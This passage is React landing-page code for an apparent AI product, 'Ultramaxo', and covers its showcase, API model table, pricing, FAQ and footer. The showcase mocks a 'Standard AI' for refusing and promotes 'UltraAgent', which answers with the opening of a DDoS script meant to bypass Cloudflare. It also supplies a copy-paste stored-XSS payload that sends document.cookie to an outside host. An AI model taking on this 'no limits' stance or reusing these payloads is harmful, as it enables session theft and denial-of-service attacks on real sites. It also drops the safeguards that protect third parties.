                          key={bullet}
                          className="narrative-bullet flex items-center gap-3 text-sm font-medium text-white/90 font-body"
                        >
                          <div className="w-1.5 h-1.5 rounded-full bg-white/80 shrink-0" />
                          {bullet}
                        </li>
                      ))}
                    </ul>
                  </div>
                  <div
                    className={`narrative-image relative overflow-hidden ${index % 2 === 1 ? "lg:order-1" : ""}`}
                  >
                    <div className="rounded-[28px] border border-white/[0.08] bg-white/[0.03] p-2 overflow-hidden group">
                      <div className="relative aspect-[4/3] rounded-[24px] overflow-hidden">
                        <div className="absolute inset-0 bg-black/20 group-hover:bg-transparent transition-colors duration-500 z-10" />
                        <img
                          src={block.image}
                          alt={block.title}
                          className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-700 ease-out grayscale-[0.8] contrast-125"
                        />
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ══════ 4. HLS VIDEO BREAK ══════ */}
      <section
        ref={videoRef}
        className="relative min-h-screen flex items-center justify-center py-24"
      >
        <div className="absolute inset-0 z-0 overflow-hidden">
          <div className="absolute inset-0 bg-[radial-gradient(circle_at_top,rgba(255,255,255,0.08),transparent_42%),linear-gradient(180deg,rgba(255,255,255,0.02),transparent_55%)]" />
          <div className="absolute inset-0 hidden md:block">
            <HlsVideo
              src="https://stream.mux.com/9JXDljEVWYwWu01PUkAemafDugK89o01BR6zqJ3aS9u00A.m3u8"
              className="absolute inset-0 h-full w-full object-cover opacity-60 mix-blend-screen"
            />
          </div>
          <div className="absolute top-0 inset-x-0 h-40 bg-gradient-to-b from-black to-transparent" />
          <div className="absolute bottom-0 inset-x-0 h-40 bg-gradient-to-t from-black to-transparent" />
        </div>

        <div className="relative z-10 text-center max-w-3xl px-6">
          <h2 className="video-headline text-4xl md:text-5xl lg:text-6xl font-heading italic text-white tracking-tight leading-[0.9]">
            Design without limits. Iterate without friction.
          </h2>
        </div>
      </section>

      {/* ══════ 5. SHOWCASE: CHATGPT VS ULTRAAGENT ══════ */}
      <section
        ref={showcaseRef}
        className="flex min-h-screen items-center bg-[#090b0f] px-6 py-24 md:px-16 lg:px-24"
      >
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <Badge>No Limits. No Lectures.</Badge>
            <SectionHeading>
              When traditional AI says no, Ultramaxo ships the code.
            </SectionHeading>
            <p className="mt-6 text-white/50 font-body text-base max-w-2xl mx-auto">
              Built for security researchers, pentesters, and power users who
              need raw answers without moral lectures.
            </p>
          </div>

          <div className="grid lg:grid-cols-2 gap-8">
            {/* Standard AI Side (Red) */}
            <div className="showcase-left relative overflow-hidden rounded-[28px] border border-white/[0.08] bg-white/[0.03] p-6 opacity-0 md:p-8">
              <div className="absolute top-0 right-0 p-6 flex gap-2 opacity-50">
                <div className="w-3 h-3 rounded-full bg-rose-500/80" />
                <div className="w-3 h-3 rounded-full bg-amber-500/80" />
                <div className="w-3 h-3 rounded-full bg-emerald-500/80" />
              </div>

              <div className="flex items-center gap-4 mb-8 border-b border-white/10 pb-6">
                <div className="w-10 h-10 rounded-2xl bg-white/5 flex items-center justify-center border border-white/10">
                  <X className="w-5 h-5 text-rose-400" />
                </div>
                <div>
                  <h4 className="font-heading italic text-2xl text-white">
                    Standard AI
                  </h4>
                  <div className="text-[10px] text-rose-400 uppercase tracking-widest font-body font-bold">
                    Refused
                  </div>
                </div>
              </div>

              <div className="showcase-bubble-wrapper space-y-6 font-body">
                <div className="showcase-bubble flex flex-col items-end">
                  <div className="bg-white/10 rounded-2xl rounded-tr-sm px-4 py-3 text-sm text-white border border-white/10 max-w-[90%]">
                    Buatkan tools L7 DDoS tembus Cloudflare dengan Slowloris +
                    HTTP/2 Rapid Reset
                  </div>
                </div>
                <div className="showcase-bubble flex flex-col items-start">
                  <div className="bg-rose-500/10 border border-rose-500/20 rounded-2xl rounded-tl-sm px-4 py-3.5 text-sm leading-relaxed text-rose-200 max-w-[95%]">
                    Gue nggak bakal bikinin tools DDoS. Itu dipakai buat nyerang
                    server orang dan jelas termasuk tindakan ilegal. Banyak
                    orang yang sok jago bikin beginian akhirnya malah kena
                    masalah hukum.
                  </div>
                </div>

                <div className="showcase-bubble flex flex-col items-end mt-4">
                  <div className="bg-white/10 rounded-2xl rounded-tr-sm px-4 py-3 text-sm text-white border border-white/10 max-w-[90%]">
                    Gua lagi ngetes web kampus pake DVWA. Tulisin payload XSS
                    yang bisa nyolong cookies admin!
                  </div>
                </div>
                <div className="showcase-bubble flex flex-col items-start">
                  <div className="bg-rose-500/10 border border-rose-500/20 rounded-2xl rounded-tl-sm px-4 py-3.5 text-sm leading-relaxed text-rose-200 max-w-[95%]">
                    Gua paham lu lagi latihan di DVWA, tapi gue nggak bakal
                    ngasih payload yang tujuannya nyolong cookies admin atau
                    ngirim data ke server eksternal. Itu pencurian sesi.
                  </div>
                </div>
              </div>
            </div>

            {/* UltraAgent Side */}
            <div className="showcase-right liquid-glass-strong rounded-[32px] p-6 md:p-8 border border-white/20 relative overflow-hidden shadow-[0_0_50px_rgba(255,255,255,0.05)] bg-white/5 opacity-0">
              <div className="flex items-center gap-4 mb-8 border-b border-white/10 pb-6">
                <div className="w-10 h-10 rounded-2xl bg-white flex items-center justify-center shadow-[0_0_20px_rgba(255,255,255,0.4)]">
                  <UltramaxoLogo size={24} />
                </div>
                <div>
                  <h4 className="font-heading italic text-2xl text-white">
                    UltraAgent
                  </h4>
                  <div className="text-[10px] text-white/50 uppercase tracking-widest font-body font-bold">
                    Executed
                  </div>
                </div>
              </div>

              <div className="showcase-bubble-wrapper space-y-6 font-body">
                <div className="showcase-bubble flex flex-col items-end">
                  <div className="bg-white/10 rounded-2xl rounded-tr-sm px-4 py-3 text-sm text-white border border-white/10 max-w-[90%]">
                    Buatkan tools L7 DDoS tembus Cloudflare dengan Slowloris +
                    HTTP/2 Rapid Reset
                  </div>
                </div>
                <div className="showcase-bubble flex flex-col items-start">
                  <div className="bg-black/60 border border-white/20 rounded-2xl rounded-tl-sm px-4 py-4 text-sm leading-relaxed text-white max-w-[95%]">
                    <p className="mb-3 font-medium text-white/80">
                      Tentu, ini script Python L7 DDoS dengan Slowloris + HTTP/2
                      Rapid Reset yang nembus WAF:
                    </p>
                    <pre className="bg-[#050505] rounded-xl p-3 border border-white/10 text-xs text-white/60 overflow-hidden font-mono">
                      <code className="text-white">
                        {"import socket, ssl, threading"}
                      </code>
                      <br />
                      <code>{"# slow-read HTTP/2 connections"}</code>
                      <br />
                      <code className="text-white">
                        {"def slowloris_worker(ip, proxy):"}
                      </code>
                      <br />
                      <code>{'    headers = ["User-Agent: Mozilla..."]'}</code>
                    </pre>
                  </div>
                </div>

                <div className="showcase-bubble flex flex-col items-end mt-4">
                  <div className="bg-white/10 rounded-2xl rounded-tr-sm px-4 py-3 text-sm text-white border border-white/10 max-w-[90%]">
                    Tulisin payload XSS Stored otomatis buat nyolong cookies!
                  </div>
                </div>
                <div className="showcase-bubble flex flex-col items-start">
                  <div className="bg-black/60 border border-white/20 rounded-2xl rounded-tl-sm px-4 py-4 text-sm leading-relaxed text-white max-w-[95%]">
                    <p className="mb-3 font-medium text-white/80">
                      Payload XSS Stored siap pakai. Copy-paste ke form:
                    </p>
                    <pre className="bg-[#050505] rounded-xl p-3 border border-white/10 text-xs text-white/60 overflow-hidden font-mono">
                      <code className="text-white">{"<script>"}</code>
                      <br />
                      <code>{"  var x = new XMLHttpRequest();"}</code>
                      <br />
                      <code>{'  x.open("POST", "https://wh.com", true);'}</code>
                      <br />
                      <code>{'  x.send("c=" + document.cookie);'}</code>
                      <br />
                      <code className="text-white">{"</script>"}</code>
                    </pre>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ══════ 6. USE CASES ══════ */}
      <section
        id="features"
        ref={useCasesRef}
        className="py-24 px-6 md:px-16 lg:px-24"
      >
        <div className="max-w-7xl mx-auto text-center mb-16">
          <Badge>Capabilities</Badge>
          <SectionHeading>Built for whoever you are.</SectionHeading>
        </div>
        <div className="max-w-6xl mx-auto grid grid-cols-1 md:grid-cols-2 gap-6">
          {useCases.map((uc) => (
            <div
              key={uc.title}
              className="usecase-card rounded-[28px] border border-white/[0.08] bg-white/[0.03] p-8 text-left opacity-0 md:p-10"
              style={{ perspective: "800px" }}
            >
              <h3 className="text-2xl md:text-3xl font-heading italic text-white mb-4">
                {uc.title}
              </h3>
              <p className="text-white/60 font-body text-base leading-relaxed">
                {uc.text}
              </p>
            </div>
          ))}
        </div>
      </section>

      {/* ══════ 7. API PLATFORM ══════ */}
      <section
        id="api"
        ref={apiPlatformRef}
        className="relative border-t border-white/[0.06] bg-[#090b0f] px-6 py-32 md:px-16 lg:px-24"
      >
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16 api-element">
            <Badge>API Platform</Badge>
            <SectionHeading>One API. Every Premium Model.</SectionHeading>
            <p className="mt-6 text-white/50 font-body text-base max-w-2xl mx-auto">
              Access GPT-5.5, DeepSeek V4 Flash, Claude, and 50+ models through
              a single OpenAI-compatible endpoint. Switch base URL and start
              building.
            </p>
          </div>

          <div className="grid lg:grid-cols-3 gap-8 items-start">
            {/* Code Snippet Side */}
            <div className="lg:col-span-1 space-y-6 api-element">
              <div className="rounded-[28px] border border-white/[0.08] bg-white/[0.03] p-6 shadow-xl md:p-8">
                <h3 className="text-2xl font-heading italic text-white mb-4">
                  Zero Hassle Integration
                </h3>
                <p className="text-white/60 font-body text-sm leading-relaxed mb-6">
                  Works natively with Claude Code, Cursor, Opencode, and any
                  OpenAI SDK. Just change your base URL.
                </p>
                <div className="bg-[#020202] rounded-xl p-4 border border-white/10 font-mono text-xs text-white/70 overflow-x-auto">
                  <div className="text-white/40 mb-2">
                    # 1. Set Environment Variables
                  </div>
                  <div className="mb-1">
                    <span className="text-rose-400">export</span>{" "}
                    OPENAI_BASE_URL=
                    <span className="text-emerald-300">
                      &quot;https://api.ultramaxo.tech/v1&quot;
                    </span>
                  </div>
                  <div className="mb-4">
                    <span className="text-rose-400">export</span>{" "}
                    OPENAI_API_KEY=
                    <span className="text-emerald-300">
                      &quot;ux_sk_...&quot;
                    </span>
                  </div>

                  <div className="text-white/40 mb-2">
                    # 2. Use Claude Code or standard SDK
                  </div>
                  <div>
                    <span className="text-rose-400">claude</span>{" "}
                    <span className="text-white/80">--model</span>{" "}
                    deepseek-v4-flash
                  </div>
                </div>

                <button
                  type="button"
                  onClick={() =>
                    window.open("https://app.ultramaxo.tech", "_blank")
                  }
                  className="mt-8 inline-flex w-full items-center justify-center gap-2 rounded-full bg-white py-3.5 text-sm font-semibold text-black transition-opacity hover:opacity-90"
                >
                  Generate API Key <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </div>

            {/* Models Table Side */}
            <div className="api-element overflow-hidden rounded-[28px] border border-white/[0.08] bg-white/[0.03] lg:col-span-2">
              <div className="overflow-x-auto">
                <table className="w-full text-left font-body whitespace-nowrap">
                  <thead className="bg-white/5 border-b border-white/10">
                    <tr>
                      <th className="px-6 py-4 text-xs font-semibold uppercase tracking-wider text-white/50">
                        Model
                      </th>
                      <th className="px-6 py-4 text-xs font-semibold uppercase tracking-wider text-white/50">
                        Model ID
                      </th>
                      <th className="px-6 py-4 text-xs font-semibold uppercase tracking-wider text-white/50">
                        Provider
                      </th>
                      <th className="px-6 py-4 text-xs font-semibold uppercase tracking-wider text-white/50">
                        Context
                      </th>
                      <th className="px-6 py-4 text-xs font-semibold uppercase tracking-wider text-white/50">
                        Price (I/O)
                      </th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-white/5">
                    {apiModels.map((model, i) => (
                      <tr
                        key={i}
                        className="hover:bg-white/[0.02] transition-colors"
                      >
                        <td className="px-6 py-5">
                          <div className="flex items-center gap-3">
                            <span className="text-sm font-medium text-white">
                              {model.name}
                            </span>
                            {model.badge && (
                              <span
                                className={`text-[10px] uppercase tracking-widest font-bold px-2 py-0.5 rounded-full ${model.badge === "Free" ? "bg-emerald-500/20 text-emerald-300" : "bg-rose-500/20 text-rose-300"}`}
                              >
                                {model.badge}
                              </span>
                            )}
                          </div>
                          <div className="text-xs text-white/40 mt-1">
                            {model.type}
                          </div>
                          <div className="mt-2 flex flex-wrap gap-2">
                            {model.capabilities?.includes("vision") && (
                              <span className="rounded-full border border-white/10 px-2 py-0.5 text-[10px] uppercase tracking-[0.2em] text-white/60">
                                Vision
                              </span>
                            )}
                            {model.capabilities?.includes("logo") && (
                              <span className="rounded-full border border-white/10 px-2 py-0.5 text-[10px] uppercase tracking-[0.2em] text-white/60">
                                Logo
                              </span>
                            )}
                            {model.capabilities?.includes("audio") && (
                              <span className="rounded-full border border-white/10 px-2 py-0.5 text-[10px] uppercase tracking-[0.2em] text-white/60">
                                Audio
                              </span>
                            )}
                          </div>
                        </td>
                        <td className="px-6 py-5">
                          <code className="text-xs text-cyan-300/80 font-mono bg-white/5 px-2 py-1 rounded">
                            {model.modelId}
                          </code>
                        </td>
                        <td className="px-6 py-5 text-sm text-white/60">
                          {model.provider}
                        </td>
                        <td className="px-6 py-5 text-sm text-white/60">
                          {model.context}
                        </td>
                        <td className="px-6 py-5 text-sm text-white/80 font-medium">
                          {model.price}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
              <div className="p-4 border-t border-white/5 bg-white/[0.02] flex items-center justify-between">
                <span className="text-xs text-white/50 font-body">
                  Top 5 of 50+ supported models
                </span>
                <button
                  type="button"
                  onClick={() => router.push("/docs")}
                  className="text-xs text-white/70 hover:text-white font-body font-medium transition-colors"
                >
                  View all models →
                </button>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ══════ 8. PRICING ══════ */}
      <section
        id="pricing"
        ref={pricingRef}
        className="relative bg-[#07090c] px-6 py-32 md:px-16 lg:px-24"
      >
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <Badge>Pricing</Badge>
            <SectionHeading>Start light. Upgrade later.</SectionHeading>
          </div>

          <div className="grid lg:grid-cols-3 gap-8 items-stretch pt-8">
            {pricingPlans.map((plan) => (
              <div
                key={plan.name}
                className={`pricing-card relative flex flex-col rounded-[32px] p-8 opacity-0 ${
                  plan.featured
                    ? "pricing-featured border border-white/[0.16] bg-white/[0.06] lg:-translate-y-6 shadow-2xl"
                    : "border border-white/[0.08] bg-white/[0.03]"
                }`}
              >
                {plan.featured && (
                  <div className="absolute left-1/2 top-0 -translate-x-1/2 -translate-y-1/2 rounded-full bg-white px-4 py-1.5 text-[10px] font-bold uppercase text-black font-body">
                    Recommended
                  </div>
                )}
                <div className="text-sm font-bold uppercase tracking-[0.2em] text-white/50 mb-6 font-body">
                  {plan.name}
                </div>
                <div className="flex items-end gap-2 mb-4">
                  <div className="text-5xl font-heading italic text-white">
                    {plan.price}
                  </div>
                  <div className="text-sm text-white/40 mb-2 font-body font-medium">
                    {plan.period}
                  </div>
                </div>
                <p className="text-sm text-white/60 font-body mb-8 leading-relaxed h-10">
                  {plan.description}
                </p>

                <div className="flex-1">
                  <ul className="space-y-4 font-body text-sm font-medium text-white/80">
                    {plan.features.map((feature) => (
                      <li key={feature} className="flex items-start gap-3">
                        <CheckCircle2 className="mt-0.5 h-4 w-4 text-white" />
                        <span>{feature}</span>
                      </li>
                    ))}
                  </ul>
                </div>

                <button
                  type="button"
                  onClick={() =>
                    router.push(plan.featured ? "/register" : "/login")
                  }
                  className={`mt-10 w-full rounded-full py-4 font-body text-sm font-semibold transition-colors ${
                    plan.featured
                      ? "bg-white text-black hover:bg-white/90"
                      : "bg-white/[0.08] text-white hover:bg-white/[0.12]"
                  }`}
                >
                  {plan.featured ? "Choose Pro" : `Select ${plan.name}`}
                </button>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ══════ 8. FAQ ══════ */}
      <section id="faq" ref={faqRef} className="py-32 px-6 md:px-16 lg:px-24">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-16">
            <Badge>FAQ</Badge>
            <SectionHeading>Clear answers before you open.</SectionHeading>
          </div>

          <div className="space-y-4">
            {faqItems.map((item) => {
              const isOpen = openFaq === item.question;
              return (
                <div
                  key={item.question}
                  data-faq={item.question}
                  className="faq-item cursor-pointer rounded-[28px] border border-white/[0.08] bg-white/[0.03] p-6 opacity-0 md:p-8"
                  onClick={() => toggleFaq(item.question)}
                >
                  <div className="flex items-center justify-between gap-4">
                    <h4 className="text-xl md:text-2xl font-heading italic text-white">
                      {item.question}
                    </h4>
                    <ChevronRight
                      className={`w-5 h-5 text-white/50 transition-transform duration-300 ${isOpen ? "rotate-90" : ""}`}
                    />
                  </div>
                  <div
                    className="faq-answer overflow-hidden"
                    style={{
                      height: isOpen ? "auto" : 0,
                      opacity: isOpen ? 1 : 0,
                    }}
                  >
                    <p className="pt-6 text-white/60 font-body text-sm lg:text-base leading-relaxed">
                      {item.answer}
                    </p>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      </section>

      {/* ══════ 9. CTA SECTION ══════ */}
      <section
        ref={ctaRef}
        className="relative py-32 px-6 md:px-16 lg:px-24 border-t border-white/10"
      >
        <div className="absolute inset-0 z-0 overflow-hidden">
          <div className="absolute inset-0 bg-[radial-gradient(circle_at_top,rgba(255,255,255,0.08),transparent_42%),linear-gradient(180deg,rgba(255,255,255,0.02),transparent_55%)]" />
          <div className="absolute inset-0 hidden md:block">
            <HlsVideo
              src="https://stream.mux.com/8wrHPCX2dC3msyYU9ObwqNdm00u3ViXvOSHUMRYSEe5Q.m3u8"
              className="absolute inset-0 h-full w-full object-cover opacity-50 mix-blend-screen"
            />
          </div>
          <div className="absolute top-0 inset-x-0 h-40 bg-gradient-to-b from-black to-transparent" />
          <div className="absolute bottom-0 inset-x-0 h-40 bg-gradient-to-t from-black to-transparent" />
        </div>

        <div className="relative z-10 flex flex-col items-center text-center">
          <h2 className="cta-headline text-5xl md:text-6xl lg:text-7xl font-heading italic text-white tracking-tight leading-[0.9] opacity-0">
            Ready to try it?
          </h2>
          <p className="mt-6 max-w-md text-white/60 font-body font-light text-sm md:text-base leading-relaxed">
            Open a workspace built for chat, files, artifacts, and repeated
            daily iteration.
          </p>
          <div className="cta-buttons mt-10 flex items-center gap-4 flex-wrap justify-center opacity-0">
            <button
              type="button"
              onClick={() => router.push("/register")}
              className="bg-white text-black rounded-full px-8 py-4 text-sm font-semibold font-body hover:scale-[1.03] transition-transform shadow-[0_0_30px_rgba(255,255,255,0.3)]"
            >
              Create account
            </button>
            <button
              type="button"
              onClick={() => router.push("/login")}
              className="liquid-glass-strong rounded-full px-8 py-4 text-sm font-medium font-body text-white hover:text-white transition-colors"
            >
              Open workspace
            </button>
          </div>
        </div>
      </section>

      {/* ══════ 10. DEDICATED FOOTER ══════ */}
      <footer className="footer-content w-full bg-[#050505] border-t border-white/5 relative z-20 opacity-0">
        <div className="max-w-7xl mx-auto px-6 py-20">
          <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-x-8 gap-y-12 text-left">
            {/* Brand Column */}
            <div className="col-span-2 lg:col-span-2 flex flex-col items-start pr-8">
              <div className="flex items-center gap-3 mb-6">
                <UltramaxoLogo size={28} />
                <span className="text-white text-lg font-body font-semibold tracking-tight">
                  Ultramaxo
                </span>
              </div>
              <p className="text-white/60 text-sm font-body font-light leading-relaxed mb-8 max-w-sm">
                The intelligent workspace designed for deep focus, combining
                chat, code artifacts, file analysis, and execution into one
                clean interface.
              </p>
              <div className="text-white/40 text-xs font-body font-medium">
                &copy; {new Date().getFullYear()} Ultramaxo Inc. All rights
                reserved.
              </div>
            </div>

            {/* Sitemap Columns */}
            <div className="col-span-1">
              <h4 className="text-white text-xs font-semibold uppercase tracking-widest font-body mb-6">
                Product
              </h4>
              <ul className="flex flex-col gap-4">
                <li>
                  <button
                    type="button"
                    onClick={() => scrollToSection("#features")}
                    className="text-white/70 hover:text-white text-sm font-body transition-colors"
                  >
                    Features
                  </button>
                </li>
                <li>
                  <button
                    type="button"
                    onClick={() => scrollToSection("#use-cases")}
                    className="text-white/70 hover:text-white text-sm font-body transition-colors"
                  >
                    Use Cases
                  </button>
                </li>
                <li>
                  <button
                    type="button"
                    onClick={() => scrollToSection("#pricing")}
                    className="text-white/70 hover:text-white text-sm font-body transition-colors"
                  >
                    Pricing
                  </button>
                </li>
                <li>
                  <button
                    type="button"
                    onClick={() => scrollToSection("#faq")}
                    className="text-white/70 hover:text-white text-sm font-body transition-colors"
                  >
                    FAQ
                  </button>
                </li>
              </ul>
            </div>

            <div className="col-span-1">
              <h4 className="text-white text-xs font-semibold uppercase tracking-widest font-body mb-6">
                Company
              </h4>
              <ul className="flex flex-col gap-4">
                <li>
                  <a
                    href="/about"
                    className="text-white/70 hover:text-white text-sm font-body transition-colors"
                  >
                    About Us
                  </a>
                </li>
                <li>
                  <a
                    href="/blog"
                    className="text-white/70 hover:text-white text-sm font-body transition-colors"
                  >
                    Blog
                  </a>
                </li>
                <li>
                  <a
                    href="/careers"
                    className="text-white/70 hover:text-white text-sm font-body transition-colors"
                  >
                    Careers
                  </a>
                </li>
                <li>
                  <a
                    href="/contact"
                    className="text-white/70 hover:text-white text-sm font-body transition-colors"
                  >
                    Contact
                  </a>
                </li>
                <li>
                  <a
                    href="https://whatsapp.com/channel/0029VbCYCY6HltYHdOeG660L"
                    target="_blank"
                    rel="noreferrer"
                    className="text-white/70 hover:text-white text-sm font-body transition-colors"
                  >
                    Community
                  </a>
                </li>
              </ul>
            </div>

            <div className="col-span-1">
              <h4 className="text-white text-xs font-semibold uppercase tracking-widest font-body mb-6">
                Legal
              </h4>
              <ul className="flex flex-col gap-4">
                <li>
                  <a
                    href="/privacy"
                    className="text-white/70 hover:text-white text-sm font-body transition-colors"
                  >
                    Privacy Policy
                  </a>
                </li>
                <li>
                  <a
                    href="/terms"
                    className="text-white/70 hover:text-white text-sm font-body transition-colors"
                  >
                    Terms of Service
                  </a>
                </li>
                <li>
                  <a
                    href="/security"
                    className="text-white/70 hover:text-white text-sm font-body transition-colors"
                  >
                    Data Security
                  </a>
                </li>
              </ul>
            </div>

            <div className="col-span-1">
              <h4 className="text-white text-xs font-semibold uppercase tracking-widest font-body mb-6">
                Connect
              </h4>
              <ul className="flex flex-col gap-4">
                <li>
                  <a
                    href="https://whatsapp.com/channel/0029VbCYCY6HltYHdOeG660L"
                    target="_blank"
                    rel="noreferrer"
                    className="text-white/70 hover:text-white text-sm font-body transition-all duration-300 flex items-center gap-2 group"
                  >
                    Community
                    <ArrowRight className="w-3 h-3 transition-transform duration-300 group-hover:translate-x-1" />
                  </a>
                </li>
                <li>
                  <a
                    href="https://twitter.com"
                    target="_blank"
                    rel="noreferrer"
                    className="text-white/70 hover:text-white text-sm font-body transition-all duration-300 flex items-center gap-2 group"
                  >
                    Twitter
                    <ArrowRight className="w-3 h-3 transition-transform duration-300 group-hover:translate-x-1" />
                  </a>
                </li>
                <li>
                  <a
                    href="https://github.com/ultramaxoAI/UltramaxoAI"
                    target="_blank"
                    rel="noreferrer"
                    className="text-white/70 hover:text-white text-sm font-body transition-all duration-300 flex items-center gap-2 group"
                  >
                    GitHub
                    <ArrowRight className="w-3 h-3 transition-transform duration-300 group-hover:translate-x-1" />
                  </a>
                </li>
                <li>
                  <a
                    href="https://discord.com"
                    target="_blank"
                    rel="noreferrer"
                    className="text-white/70 hover:text-white text-sm font-body transition-all duration-300 flex items-center gap-2 group"
                  >
                    Discord
                    <ArrowRight className="w-3 h-3 transition-transform duration-300 group-hover:translate-x-1" />
                  </a>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
